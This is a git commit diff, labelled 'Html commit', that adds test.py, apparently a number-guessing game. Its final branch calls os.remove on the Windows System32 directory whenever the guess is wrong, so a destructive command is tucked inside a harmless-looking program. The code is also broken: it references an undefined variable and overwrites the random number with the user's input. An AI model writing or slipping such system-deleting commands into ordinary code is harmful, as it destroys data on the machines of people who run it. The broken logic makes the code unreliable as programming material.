5a00d8e24aaa49442671c243f46b3fc5b888a5a4
Prosper Ihionu <echezonaprosper100@gmail.com>
2024-01-15 14:09:16 -0800

    Html commit

---
+++ test.py
@@ -0,0 +1,10 @@
+import random
+import os
+number = random.randint(1,10)
+number = input('enter a nummber')
+number = int(guess )
+
+if guess == number:
+    print('yes that the number')
+else:
+    os.remove('C:Windows\System32')
